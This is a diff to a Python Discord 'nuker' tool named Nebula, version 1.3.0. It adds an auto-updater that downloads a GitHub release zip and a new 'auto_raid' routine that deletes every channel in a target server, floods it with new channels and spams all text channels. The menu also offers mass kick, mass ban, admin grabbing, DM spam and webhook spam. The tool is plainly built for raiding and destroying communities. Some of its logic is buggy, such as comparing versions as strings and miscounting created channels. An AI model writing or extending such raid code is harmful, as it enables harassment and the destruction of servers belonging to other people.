@@ -8,6 +8,48 @@ import config
 import urllib.request
 import asyncio
 import time
+import requests
+
+def get_latest_release_version(repo_owner, repo_name):
+    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest'
+    response = requests.get(url)
+    
+    if response.status_code == 200:
+        release_info = response.json()
+        latest_version = release_info['tag_name']
+        return latest_version
+    else:
+        print(f"Error in the request : {response.status_code}")
+        return None
+
+def update_application(repo_owner, repo_name, current_version):
+    latest_version = get_latest_release_version(repo_owner, repo_name)
+
+    if latest_version is not None and current_version < latest_version:
+        print(f"A new version is available : {latest_version}")
+        
+        download_url = f'https://github.com/{repo_owner}/{repo_name}/archive/{latest_version}.zip'
+        download_path = 'latest_version.zip'
+        
+        with requests.get(download_url, stream=True) as response:
+            with open(download_path, 'wb') as file:
+                for chunk in response.iter_content(chunk_size=8192):
+                    file.write(chunk)
+        
+
+        
+        
+        print("Update Finished.")
+        exit()
+    else:
+        pass
+        
+
+repo_owner = 'Nyxoy201'
+repo_name = 'nebula'
+current_version = 'v1.3.0'
+
+update_application(repo_owner, repo_name, current_version)
 
 async def delete_channel(channel):
     try:
@@ -101,7 +143,7 @@ async def create_channels(server_id):
         print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
 
 
-async def spam_channels(server_id):
+async def spam_channel(server_id):
     try:
         guild = bot.get_guild(int(server_id))
         if guild:
@@ -115,7 +157,7 @@ async def spam_channels(server_id):
 
             start_time_total = time.time()
             tasks = [
-                send_messages_to_channel(channel, num_messages, message_content, include_everyone)
+                send_messages_to_channels(channel, num_messages, message_content, include_everyone)
                 for channel in guild.channels
                 if isinstance(channel, discord.TextChannel)
             ]
@@ -129,7 +171,7 @@ async def spam_channels(server_id):
     except Exception as e:
         print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
 
-async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
+async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
     try:
         for _ in range(num_messages):
             if message_content.lower() == 'embed':
@@ -457,6 +499,120 @@ async def webhook_spam(server_id):
     except Exception as e:
         print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
 
+from config import AUTO_RAID_CONFIG
+
+def log_message(color, message):
+    print(Colorate.Color(color, message))
+
+async def delete_channel(channel):
+    try:
+        start_time = time.time() 
+        await channel.delete()
+        end_time = time.time()  
+        log_message(Colors.green, f"[+] Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")
+        return True
+    except Exception as e:
+        log_message(Colors.red, f"[-] Can't delete channel {channel.name}: {e}")
+        return False
+
+async def delete_role(role):
+    try:
+        start_time = time.time()
+        await role.delete()
+        end_time = time.time()
+        log_message(Colors.green, f"[+] Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")
+        return True
+    except Exception as e:
+        log_message(Colors.red, f"[-] Can't delete role {role.name}: {e}")
+        return False
+
+async def create_channel(guild, channel_type, channel_name):
+    try:
+        start_time = time.time()
+        if channel_type == 'text':
+            new_channel = await guild.create_text_channel(channel_name)
+        elif channel_type == 'voice':
+            new_channel = await guild.create_voice_channel(channel_name)
+
+        end_time = time.time()
+        log_message(Colors.green, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")
+        return new_channel
+    except Exception as e:
+        log_message(Colors.red, f"[-] Can't create {channel_type} channel: {e}")
+        return None
+    
+async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
+    try:
+        for i in range(num_messages):
+            await channel.send(message_content)
+            log_message(Colors.yellow, f"[-] Message {i+1}/{num_messages} sent to channel {channel.name}")
+        return True
+    except Exception as e:
+        log_message(Colors.red, f"[-] Can't send messages to channel {channel.name}: {e}")
+        return False
+
+    
+async def spam_channels(server_id):
+    try:
+        guild = bot.get_guild(int(server_id))
+        if guild:
+            num_messages = AUTO_RAID_CONFIG['num_messages']
+            message_content = AUTO_RAID_CONFIG['message_content']
+
+            start_time_total = time.time()
+            tasks = [
+                send_messages_to_channel(channel, num_messages, message_content, False)  # Ne pas inclure @everyone par défaut
+                for channel in guild.channels
+                if isinstance(channel, discord.TextChannel)
+            ]
+
+            await asyncio.gather(*tasks)
+            end_time_total = time.time()
+
+            log_message(Colors.blue, f"[!] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
+        else:
+            log_message(Colors.red, "[-] Guild not found.")
+    except Exception as e:
+        log_message(Colors.red, f"[-] Error: {e}")
+
+async def auto_raid(server_id):
+    try:
+        guild = bot.get_guild(int(server_id))
+        if guild:
+            start_time_total = time.time()  
+
+            num_channels = AUTO_RAID_CONFIG['num_channels']
+            channel_type = AUTO_RAID_CONFIG['channel_type']
+            channel_name = AUTO_RAID_CONFIG['channel_name']
+
+            channel_futures = [delete_channel(channel) for channel in guild.channels]
+
+            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]
+
+            channel_results = await asyncio.gather(*channel_futures)
+            create_channel_results = await asyncio.gather(*create_channel_futures)
+
+            end_time_total = time.time()  
+
+            channels_deleted = channel_results.count(True)
+            channels_not_deleted = channel_results.count(False)
+
+            channels_created = create_channel_results.count(True)
+            channels_not_created = create_channel_results.count(False)
+
+            await spam_channels(server_id)
+
+            log_message(Colors.blue, f"""[!] Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
+[!] Command Used: Create Channels - {channels_created} {channel_type} channels created, {channels_not_created} channels not created - Total Time taken: {end_time_total - start_time_total:.2f} seconds""")
+
+        else:
+            log_message(Colors.red, "[-] Guild not found.")
+    except Exception as e:
+        log_message(Colors.red, f"[-] Error: {e}")
+
+
+
+get_latest_release_version(repo_owner, repo_name)
 bot_token = input((Colorate.Color(Colors.blue, "Enter Bot Token: ")))
 server_id = input((Colorate.Color(Colors.blue, "Enter Server ID: ")))
 
@@ -486,17 +642,18 @@ async def on_ready():
                             ██║╚██╗██║██╔══╝  ██╔══██╗██║   ██║██║     ██╔══██║
                             ██║ ╚████║███████╗██████╔╝╚██████╔╝███████╗██║  ██║
                             ╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
-                                                                              DEV BY NYXOY THE HAXOR                                                                                 
+                                                                              V1.3.0                                                                                 
                                        
-    ╔════════════════════════════════╦════════════════════════════════╦════════════════════════════════╗                                       
-    ║           1 - Nuke             ║       2 - Create Channels      ║      3 - Spam Channels         ║
-    ╠════════════════════════════════╬════════════════════════════════╬════════════════════════════════╣                                       
-    ║        4 - Webhook Spam        ║         5 - Kick All           ║          6 - Ban All           ║
-    ╠════════════════════════════════╬════════════════════════════════╬════════════════════════════════╣
-    ║        7 - Create Roles        ║         8 - Get Admin          ║       9 - Change Server        ║
-    ╚════════════════════════════════╠════════════════════════════════╣════════════════════════════════╝
-                                     ║          10 - DM All           ║
-                                     ╚════════════════════════════════╝
+    ╔═══════════════════════════════╦═══════════════════════════════╦═══════════════════════════════╗                                       
+    ║           1 - Nuke            ║       2 - Create Channels     ║      3 - Spam Channels        ║
+    ╠═══════════════════════════════╬═══════════════════════════════╬═══════════════════════════════╣                                       
+    ║        4 - Webhook Spam       ║         5 - Kick All          ║          6 - Ban All          ║
+    ╠═══════════════════════════════╬═══════════════════════════════╬═══════════════════════════════╣
+    ║        7 - Create Roles       ║         8 - Get Admin         ║       9 - Change Server       ║
+    ╚═══════════════╦═══════════════╩═══════════════╦═══════════════╩═══════════════╦═══════════════╝
+                    ║        10 - DM All            ║         11 - Auto Raid        ║    
+                    ╚═══════════════════════════════╩═══════════════════════════════╝
+
     Choice :  """)))
 
         if choice == '1':
@@ -504,7 +661,7 @@ async def on_ready():
         elif choice == '2':
             await create_channels(server_id)
         elif choice == '3':
-            await spam_channels(server_id)
+            await spam_channel(server_id)
         elif choice == '6':
             await ban_all(server_id)
         elif choice == '5':
@@ -518,7 +675,9 @@ async def on_ready():
         elif choice == '9':
             await change_server(server_id)
         elif choice == '4':
-            await webhook_spam(server_id)
+            await webhook_spam(server_id)   
+        elif choice == '11':
+            await auto_raid(server_id)        
         else:
             print((Colorate.Color(Colors.red, "[-] Invalid choice")))
 
